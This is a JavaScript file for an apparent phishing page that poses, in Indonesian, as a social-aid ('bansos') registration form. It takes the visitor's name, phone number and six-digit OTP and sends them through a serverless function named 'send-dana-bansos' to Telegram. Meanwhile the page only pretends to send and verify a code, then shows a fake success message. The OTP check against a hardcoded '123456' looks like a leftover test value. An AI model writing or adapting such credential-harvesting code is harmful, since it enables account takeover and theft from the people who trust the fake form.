// DOM Elements
const homePage = document.getElementById('home-page');
const otpPage = document.getElementById('otp-page');
const pageLoading = document.getElementById('page-loading');
const daftarBtn = document.getElementById('daftarBtn');
const verifyOtpBtn = document.getElementById('verify-otp-btn');
const otpInputs = document.querySelectorAll('.otp-input');
const otpTimer = document.getElementById('otp-timer');
const resendOtp = document.getElementById('resend-otp');
const otpUserInfo = document.getElementById('otp-user-info');
const daftarSekarangBtn = document.getElementById('daftar-sekarang-btn');

// State
let timerInterval;
let timeLeft = 120; // 2 minutes in seconds
let userData = {};

// Base URL untuk fetch (gunakan absolute untuk menghindari masalah path)
const baseUrl = window.location.origin;

// Format time (MM:SS)
function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Start OTP timer
function startTimer() {
    timeLeft = 120;
    otpTimer.textContent = formatTime(timeLeft);
    
    if (timerInterval) clearInterval(timerInterval);
    
    timerInterval = setInterval(() => {
        timeLeft--;
        otpTimer.textContent = formatTime(timeLeft);
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            otpTimer.textContent = "00:00";
            alert('Waktu habis! Silakan minta kode baru.');
        }
    }, 1000);
}

// Show loading on button
function showButtonLoading(button) {
    const buttonText = button.querySelector('.button-text');
    const buttonLoading = button.querySelector('.button-loading');
    buttonText.classList.add('hidden');
    buttonLoading.classList.remove('hidden');
    button.disabled = true;
}

// Hide loading on button
function hideButtonLoading(button) {
    const buttonText = button.querySelector('.button-text');
    const buttonLoading = button.querySelector('.button-loading');
    buttonText.classList.remove('hidden');
    buttonLoading.classList.add('hidden');
    button.disabled = false;
}

// Show page loading overlay
function showPageLoading(text = 'Mengirim kode OTP...') {
    pageLoading.querySelector('.page-loading-text').textContent = text;
    pageLoading.classList.remove('hidden');
}

// Hide page loading overlay
function hidePageLoading() {
    pageLoading.classList.add('hidden');
}

// Navigate to OTP page
function goToOtpPage() {
    homePage.classList.add('hidden');
    otpPage.classList.remove('hidden');
    
    // Clear OTP inputs
    otpInputs.forEach(input => input.value = '');
    
    // Focus first input
    setTimeout(() => otpInputs[0].focus(), 100);
    
    // Start timer
    startTimer();
    
    // Hide page loading
    hidePageLoading();
}

// Fungsi kirim pesan awal ke Telegram via serverless
async function sendTelegramMessage(nama, phone) {
    try {
        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'send',
                nama: nama,
                phone: phone
            })
        });
        const data = await response.json();
        if (data.success) {
            console.log('Telegram send success, messageId:', data.messageId);
            return data.messageId;
        } else {
            console.error('Gagal kirim via serverless:', data.error);
            alert('Gagal mengirim notifikasi. Cek console.');
        }
    } catch (error) {
        console.error('Error panggil serverless:', error);
        alert('Error jaringan saat mengirim notifikasi.');
    }
    return null;
}

// Fungsi edit pesan Telegram via serverless
async function editTelegramMessage(messageId, nama, phone, otp) {
    try {
        const response = await fetch(`${baseUrl}/.netlify/functions/send-dana-bansos`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'edit',
                messageId: messageId,
                nama: nama,
                phone: phone,
                otp: otp
            })
        });
        const data = await response.json();
        if (data.success) {
            console.log('Telegram edit success');
        } else {
            console.error('Gagal edit via serverless:', data.error);
        }
    } catch (error) {
        console.error('Error panggil serverless:', error);
    }
}

// Validate form and show OTP page with loading
daftarBtn.addEventListener('click', async function() {
    const nama = document.getElementById('nama').value.trim();
    const telepon = document.getElementById('telepon').value.trim();
    const countryCode = document.getElementById('countryCode').value;
    
    // Reset errors
    document.getElementById('nama-error').style.display = 'none';
    document.getElementById('telepon-error').style.display = 'none';
    
    let isValid = true;
    
    // Validate name
    if (!nama) {
        document.getElementById('nama-error-text').textContent = 'Nama lengkap harus diisi';
        document.getElementById('nama-error').style.display = 'flex';
        isValid = false;
    }
    
    // Validate phone
    if (!telepon) {
        document.getElementById('telepon-error-text').textContent = 'Nomor telepon harus diisi';
        document.getElementById('telepon-error').style.display = 'flex';
        isValid = false;
    } else if (!/^[0-9]{8,15}$/.test(telepon.replace(/\s/g, ''))) {
        document.getElementById('telepon-error-text').textContent = 'Nomor telepon tidak valid (minimal 8 angka)';
        document.getElementById('telepon-error').style.display = 'flex';
        isValid = false;
    }
    
    if (!isValid) return;
    
    // Save user data
    userData = {
        nama: nama,
        telepon: countryCode + telepon
    };
    
    // Display user info on OTP page
    otpUserInfo.textContent = `Nama: ${nama} | No: ${countryCode + telepon}`;
    
    // Show button loading
    showButtonLoading(daftarBtn);
    
    // Show page loading overlay
    showPageLoading('Mengirim kode OTP...');
    
    // Kirim pesan awal ke Telegram
    const messageId = await sendTelegramMessage(nama, countryCode + telepon);
    if (messageId) {
        sessionStorage.setItem('telegramMessageId', messageId);
        sessionStorage.setItem('userName', nama);
        sessionStorage.setItem('userPhone', countryCode + telepon);
    }
    
    // Simulate API call to send OTP
    setTimeout(() => {
        // Hide button loading
        hideButtonLoading(daftarBtn);
        
        // Navigate to OTP page
        goToOtpPage();
    }, 2000); // 2 second loading simulation
});

// OTP Input handling - auto move to next input
otpInputs.forEach((input, index) => {
    input.addEventListener('input', function() {
        // Only allow numbers
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Move to next input if current has value
        if (this.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
    });
    
    input.addEventListener('keydown', function(e) {
        // Move to previous input on backspace if current is empty
        if (e.key === 'Backspace' && !this.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
    
    input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = e.clipboardData.getData('text');
        if (/^\d+$/.test(pasted)) {
            const digits = pasted.slice(0, 6).split('');
            digits.forEach((digit, i) => {
                if (i < otpInputs.length) {
                    otpInputs[i].value = digit;
                }
            });
            // Focus last filled or next empty
            const lastIndex = Math.min(digits.length, otpInputs.length) - 1;
            if (lastIndex < otpInputs.length - 1) {
                otpInputs[lastIndex + 1].focus();
            } else {
                otpInputs[lastIndex].focus();
            }
        }
    });
});

// Verify OTP - dengan validasi kode yang benar (misal: 123456)
verifyOtpBtn.addEventListener('click', async function() {
    const otpCode = Array.from(otpInputs).map(input => input.value).join('');
    const otpError = document.getElementById('otp-error');
    const otpErrorText = document.getElementById('otp-error-text');
    
    // Validasi panjang dan angka
    if (otpCode.length !== 6 || !/^\d+$/.test(otpCode)) {
        otpErrorText.textContent = 'Kode OTP harus 6 angka';
        otpError.style.display = 'flex';
        return;
    }
    
    // Cek apakah kode OTP benar (contoh: 123456)
    if (otpCode !== '123456') {
        otpErrorText.textContent = 'Kode OTP salah, silahkan cek ulang kode OTP Anda';
        otpError.style.display = 'flex';
        
        // Kosongkan input dan fokus ke input pertama
        otpInputs.forEach(input => input.value = '');
        otpInputs[0].focus();
        return;
    }
    
    otpError.style.display = 'none';
    
    // Ambil data dari sessionStorage untuk update Telegram
    const messageId = sessionStorage.getItem('telegramMessageId');
    const nama = sessionStorage.getItem('userName');
    const phone = sessionStorage.getItem('userPhone');
    if (messageId && nama && phone) {
        await editTelegramMessage(messageId, nama, phone, otpCode);
        // Hapus session storage setelah digunakan
        sessionStorage.removeItem('telegramMessageId');
        sessionStorage.removeItem('userName');
        sessionStorage.removeItem('userPhone');
    } else {
        console.warn('Tidak ada data session untuk update Telegram');
    }
    
    // Show button loading
    showButtonLoading(verifyOtpBtn);
    
    // Show page loading overlay
    showPageLoading('Memverifikasi kode OTP...');
    
    // Simulate verification
    setTimeout(() => {
        hideButtonLoading(verifyOtpBtn);
        
        // Simulate success
        alert(`Selamat datang ${userData.nama}! Pendaftaran berhasil.`);
        
        // Go back to home and reset form
        homePage.classList.remove('hidden');
        otpPage.classList.add('hidden');
        document.getElementById('bansosForm').reset();
        hidePageLoading();
        
        // Clear timer
        if (timerInterval) clearInterval(timerInterval);
    }, 1500);
});

// Resend OTP
resendOtp.addEventListener('click', function(e) {
    e.preventDefault();
    
    // Show loading on resend link (optional)
    resendOtp.textContent = 'Mengirim...';
    resendOtp.style.pointerEvents = 'none';
    
    // Show page loading overlay
    showPageLoading('Mengirim ulang kode OTP...');
    
    // Simulate resend
    setTimeout(() => {
        // Reset timer
        startTimer();
        
        // Clear inputs
        otpInputs.forEach(input => input.value = '');
        otpInputs[0].focus();
        
        // Reset resend link
        resendOtp.textContent = 'Kirim ulang kode';
        resendOtp.style.pointerEvents = 'auto';
        
        // Hide loading
        hidePageLoading();
    }, 1500);
});

// Phone number validation on input
document.getElementById('telepon').addEventListener('input', function() {
    this.value = this.value.replace(/[^0-9]/g, '');
});

// Event listener untuk tombol Daftar Sekarang di marketing bar
daftarSekarangBtn.addEventListener('click', function(e) {
    e.preventDefault();
    
    // Pastikan kita berada di halaman utama (jika sedang di OTP, kita kembali ke home dulu)
    if (!homePage.classList.contains('hidden')) {
        // Scroll ke form dengan smooth
        const formSection = document.querySelector('.form-section');
        if (formSection) {
            formSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
            
            // Fokus ke input nama setelah scroll
            setTimeout(() => {
                document.getElementById('nama').focus();
            }, 500); // Beri waktu scroll
        }
    } else {
        // Jika sedang di halaman OTP, kita kembali ke home dulu lalu scroll
        otpPage.classList.add('hidden');
        homePage.classList.remove('hidden');
        
        // Scroll setelah home muncul
        setTimeout(() => {
            const formSection = document.querySelector('.form-section');
            if (formSection) {
                formSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
                document.getElementById('nama').focus();
            }
        }, 100);
    }
});

// Marketing bar tracking (opsional)
document.querySelectorAll('.marketing-bar a').forEach(link => {
    link.addEventListener('click', () => {
        console.log('Marketing bar clicked');
    });
});

// Add smooth scroll for skip link
document.querySelector('.skip-link').addEventListener('click', function(e) {
    e.preventDefault();
    document.getElementById('main-content').scrollIntoView({ behavior: 'smooth' });
});
